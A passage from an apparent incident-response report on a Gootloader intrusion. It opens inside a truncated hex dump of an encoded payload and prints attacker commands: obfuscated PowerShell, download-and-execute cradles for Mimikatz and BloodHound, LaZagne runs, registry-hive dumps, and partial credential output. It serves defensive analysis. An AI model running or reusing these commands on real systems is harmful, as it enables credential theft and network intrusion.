x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x75,0x6e,0x\n```\n\nThe second layer of encoding contains a Base64 encoded string resulting in Gunzipped data.\n\n```image\nAlt: Base64 Encoded\nDescription: The image displays a lengthy encoded PowerShell script, likely used for malicious purposes in a cyber attack, illustrating the complexity of the encoding methods employed by the threat actor. The script is presented in a monospaced font, indicating it is code rather than regular text. The encoding seems to involve multiple layers, including Base64 and potentially other obfuscation techniques, and appears to be related to the execution of a WMIExec script for remote queries.\n```\n\nDecoding this script reveals that it is a publicly available WMIExec script for running remote WMI queries.\n\n```image\nAlt: WMIExec\nDescription: The image depicts a user interface for a decoding tool, showing an input section containing a Base64 encoded string that has been obfuscated. The output section displays the decoded PowerShell script named 'Invoke-WMIExec', which includes comments and parameters for executing WMI commands on target hosts using NTLMv2 for authentication. The layout suggests this is a practical demonstration of decoding a potentially malicious script related to cyber threats.\nTranscription: |\n  function Invoke-WMIExec\n  {\n  <#\n  .SYNOPSIS\n  Invoke-WMIExec performs WMI command execution on targets using NTLMv2 pass the hash authentication.\n  \n  Author: Kevin Robertson (@kevin_robertson)\n  License: BSD 3-Clause\n  \n  .PARAMETER Target\n  Hostname or IP address of target.\n  \n  .PARAMETER Username\n  Username to use for authentication.\n  \n  .PARAMETER Domain\n  Domain to use for authentication. This parameter is not needed with local accounts or when using @domain after the username.\n  \n  .PARAMETER Hash\n  NTLM password hash for authentication. This module will accept either LM:NTLM or NTLM format.\n  \n  .PARAMETER Command\n  Command to execute on the target. If a command is not specified, the function will just check to see if the username and hash has access to WMI on the target.\n  #>\n```\n\n## Credential Access\n\nThe malicious PowerShell process used by Gootloader dropped a PowerShell script named “mi.ps1” on the file system.\n\n```image\nAlt: mi.ps1\nDescription: The image displays a table documenting a file creation event related to a cybersecurity incident. It includes columns for 'Action Type', 'Folder Path', 'File Name', and 'Initiating Process Folder Path'. The 'Action Type' indicates 'FileCreated', the 'Folder Path' shows 'C:\\Users\\<redacted>', the 'File Name' is 'mi.ps1', and the 'Initiating Process Folder Path' is 'C:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe'. This data is relevant to tracking the activities of a malicious PowerShell script in the context of credential access.\nTranscription: |\n  Action Type      Folder Path      File Name   Initiating Process Folder Path\n  FileCreated      C:\\Users\\[redacted]   mi.ps1      c:\\windows\\syswow64\\windowspowershell\\v1.0\\powershell.exe\n```\n\nAnother PowerShell command was used to trigger the mi.ps1 script. The script was using XOR-encoding.\n\n```image\nAlt: XOR Encoding\nDescription: The image depicts a detailed output related to a PowerShell process creation event. It includes a command line that shows the execution of a PowerShell script with various parameters and encoded elements. The command appears to be part of a malicious activity, possibly related to credential access or exploitation. Key elements include the use of '-nop', '-noninteractive', and '-ep bypass' flags, along with a script block creation and a base64 encoded string that suggests obfuscation techniques typical in cyber threats.\nTranscription: |\n  TaskCategory          CommandLine\n  Process Create        powershell -nop -noni -ep bypass -w h -c \"$t=([type]'Convert');&([scriptblock]::Create(($t::(($t.GetMethods()|?{$_.Name -clike'F*g'}).Name)('PG01MD9wbGxoJjC3KSoVNjg2KDYpi1oqKi9Nz9kPMWWuUpVODxHMWUxIzxtZDAwX1tOVEFyTFVdMjEjOFFlaHdqbDVVd3xtdH04WyJETWt9amtEMYVIrcHk2dXdrdHlHRVxNmhrKSM4UXZud3N9NVVxdXFzelwx10DVbd3VobWx9a1Z5dX04XF1LU0xXSDVLSeXBTY8u'))%{$_-bxor24}|%{[char]$_})-join'')\"\n```\n\nThis CyberChef recipe can be used to decode the inner encoded command.\n\nThe output lists “Invoke-Mimikatz”, a direct reference to the PowerShell Invoke-Mimikatz.ps1 script used to load Mimikatz DLL directly in memory.\n\n```\n$u=('http://127.0.0.1:22201/'|%{(IRM $_)});$u|&(GCM I*e-E*); Import-Module C:\\Users\\<redacted>\\mi.ps1; Invoke-Mimikatz -ComputerName <redacted>\n```\n\nMonitoring PowerShell event id 4103 we can observe the threat actor’s successful credential access activity from the Mimikatz invocation.\n\n```image\nAlt: Mimikatz\nDescription: The image displays a terminal output related to the Mimikatz tool, specifically its logon passwords command invocation. It reveals detailed authentication information such as the Authentication ID, User Name, Domain, Logon Server, and various Security Identifiers (SIDs). The output also shows encrypted passwords and associated data for different user sessions, which are vital for cybersecurity analysis and understanding credential access methods used by attackers.\nTranscription: |\n  \"CommandInvocation(Out-Default): \"Out-Default\"\n  ParameterBinding(Out-Default): name=\"InputObject\", value=\"\n    .#####.   mimikatz 2.2.0 (x64) #19041 Jul 24 2021 11:00:11\n   .## ^ ##.  \"A La Vie, A L'Amour\"  (oe.eo)\n   ## / \\ ##  /*** Benjamin DELPY 'gentilkiwi' ( benjamin@gentilkiwi.com )\n   ## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n   '## v ##'  /*** Vincent LE TOUX             ( vincent.letoux@gmail.com )\n    '#####'       > https://pingcastle.com / https://mysmartlogon.com ***\n  \n  mimikatz(powershell) # sekurlsa::logonpasswords\n  \n  Authentication Id : 0 ; 58533736 (00000000:037d2600)\n  Session           : Interactive from 4\n  User Name         : DWM-4\n  Domain            : Window Manager\n  Logon Server      : (null)\n  Logon Time        : \n  SID               : S-1-5-90-0-4\n  \n          msv :\n           [00000003] Primary\n           * Username : \n           * Domain   : \n           * NTLM     : eb40793              f7177c39\n           * SHA1     : 348211b              5c344070060a76d3\n          tspkg :\n          wdigest :\n           * Username : \n           * Domain   : \n           * Password : (null)\n          kerberos :\n           * Username :                      $\n           * Domain   : .local\n           * Password : &7y`HDCPk_IwQw&^poDZ3aZ,                 -3#Cri2)&s-!&3fi:JT+qg$8^hH6lv4W;\n          ssp :\n          credman :\n          cloudap :\n  \n  Authentication Id : 0 ; 58526506 (00000000:037db02a)\n  Session           : Interactive from 4\n  User Name         : UMFD-4\n  Domain            : Font Driver Host\n  Logon Server      : (null)\n  Logon Time        : 1/31/2022 4:32:26 PM\n  SID               : S-1-5-96-0-4\n  \n          msv :\n           [00000003] Primary\n           * Username :\n```\n\nIn addition, the post-exploitation tool “LaZagne” (renamed to ls.exe) was used with the “-all” switch.\n\n```\nls.exe all -oN -output C:\\Users\\REDACTED\n```\n\nThis will dump passwords (browsers, LSA secret, hashdump, Keepass, WinSCP, RDPManager, OpenVPN, Git, etc.) and store the output file (in our case) in the “C:\\Users” directory. When LaZagne is run with admin privileges, it also attempts to dump credentials from local registry hives, as can be seen below.\n\n```image\nAlt: LaZagne\nDescription: The image displays a table with command line entries related to security processes. It includes commands executed via cmd.exe that save registry hives (security, sam, and system) to specific temporary directory locations on a Windows system. Each command line entry is shown along with its parent command line, indicating the context of execution, which is relevant for analyzing cyber threats and understanding credential access activities.\nTranscription: |\n  CommandLine                                                                                 ParentCommandLine\n  cmd.exe /c \"reg.exe save hklm\\security c:\\windows\\temp\\xoeofpxxon\"                          ls.exe all -oN -output C:\\Users\n  cmd.exe /c \"reg.exe save hklm\\sam c:\\windows\\temp\\nibkqjzy\"                                 ls.exe all -oN -output C:\\Users\n  cmd.exe /c \"reg.exe save hklm\\system c:\\windows\\temp\\nfwlgripmy\"                           ls.exe all -oN -output C:\\Users\n```\n\nHere’s the commands from another system:\n\n```\ncmd.exe /c \"reg.exe save hklm\\sam c:\\users\\REDACTED\\appdata\\local\\temp\\1\\dznuxujzr\"\ncmd.exe /c \"reg.exe save hklm\\system c:\\users\\REDACTED\\appdata\\local\\temp\\1\\mkffdg\"\ncmd.exe /c \"reg.exe save hklm\\security c:\\users\\REDACTED\\appdata\\local\\temp\\1\\iszmqwmjemt\"\n```\n\n## Discovery\n\nThe threat actors used the PowerShell implementation of SharpHound (Bloodhound) on the beachhead host to enumerate the Active Directory domain. The Cobalt Strike beacon was used to invoke the PowerShell script.\n\n```\npowershell -nop -exec bypass -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgAxADAAMAA0ADkALwAnACkAOwAgAEkAbgB2AG8AawBlAC0AQgBsAG8AbwBkAEgAbwB1AG4AZAAgAC0AQwBvAGwAbABlAGMAdABpAG8AbgBNAGUAdABoAG8AZAAgAEEAbABsAA==\n```\n\n```image\nAlt: SharpHound\nDescription: The image shows a web interface for decoding Base64 encoded text. On the left side, there is an input area labeled 'Input' where the Base64 encoded string is displayed. Below it, there is a section titled 'Output' which shows the decoded result. The output reveals a PowerShell command that uses 'Invoke-BloodHound' to collect Active Directory data from a specified IP address. The interface includes options for adjusting the decoding parameters, such as the encoding type.\nTranscription: |\n  Recipe\n  \n  From Base64\n  Alphabet\n  A-Za-z0-9+/=\n  \n  [ ] Remove non-alphabet chars\n  \n  Decode text\n  Encoding\n  UTF-16LE (1200)\n  \n  Input\n  SQBFAFgAIABoAE4AZQB3AG8AbAAtTwBiAGoAZQBjAHQAIABOAGUAdwBCAHgALgBGAE8AdwBuAGQAbwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAA\n  nAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMQAwADoANQAwADQAMgAnACkAIABJAG4AdgBvAGsAZQAtAEIAbABvAG8AZABoAG8AdQBuAGQAI\n  AAtAEMAbwBsAGwAZQBjAHQAaQBvAG4ATQBlAHQAcgBvAGQAIABBAGwAbAA=\n  \n  Output\n  IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1:10040/'); Invoke-BloodHound -CollectionMethod All\n```\n\nThey also ran a WMI command on the beachhead host and one other host to check for AntiVirus.\n\n```\nWMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List\n```\n\nThe threat actors executed this command remotely on a domain controller, before moving laterally to it:\n\n```\npowershell.exe ls C:\\ > C:\\file.txt\n```\n\nWhile having an interactive RDP session, in an attempt to collect more information regarding the host, the attackers used PowerShell to run systeminfo on one of the hosts they pivoted to.\n\nOn the last day, and before they left the network, threat actors used Advanced IP Scanner to scan the whole network for the below open ports:\n\n```\n21,80,135,443,445,3389,8080,56133,58000,58157,58294,58682,60234,60461,64502\n```\n\n```image\nAlt: Advanced IP Scanner\nDescription: The image displays a structured log table containing security event data related to the execution of the Advanced IP Scanner tool. It includes columns such as EventCode, TaskCategory, TargetFilename, ParentImage, and CommandLine. The log entries provide details about file creation and process initiation associated with the Advanced IP Scanner executable, indicating how the tool was run and its parent processes. This log is relevant for tracking malicious activity and understanding lateral movement within a network.\nTranscription: |\n  plaintext\n  EventCode  TaskCategory                          TargetFilename                                                         ParentImage                                    CommandLine\n  11         File created                          C:\\Users\\████\\Advanced_IP_Scanner_2.5.3850.exe                         C:\\Windows\\explorer.exe                        \"C:\\Users\\████\\Advanced_IP_Scanner_2.5.3850.exe\"\n             (rule: FileCreate)\n  \n  1          Process Create                        C:\\Users\\████\\Advanced_IP_Scanner_2.5.3850.exe                         C:\\Users\\████\\AppData\\Local\\Temp\\1\\is-JN8UC.tmp\\Advanced_IP_Scanner_2.5.3850.tmp\n             (rule: ProcessCreate)                                                                                       \"C:\\Users\\████\\AppData\\Local\\Temp\\1\\is-JN8UC.tmp\\Advanced_IP_Scanner_2.5.3850.tmp\" /SL5=\"$7025C,19765324,139776,C:\\Users\\████\\Advanced_IP_Scanner_2.5.3850.exe\"\n  \n  1          Process Create                        C:\\Users\\████\\AppData\\Local\\Temp\\1\\Advanced IP Scanner                C:\\Users\\████\\AppData\\Local\\Temp\\1\\is-JN8UC.tmp\\Advanced_IP_Scanner_2.5.3850.tmp\n             (rule: ProcessCreate)                                                                                       \"C:\\Users\\████\\AppData\\Local\\Temp\\1\\Advanced IP Scanner 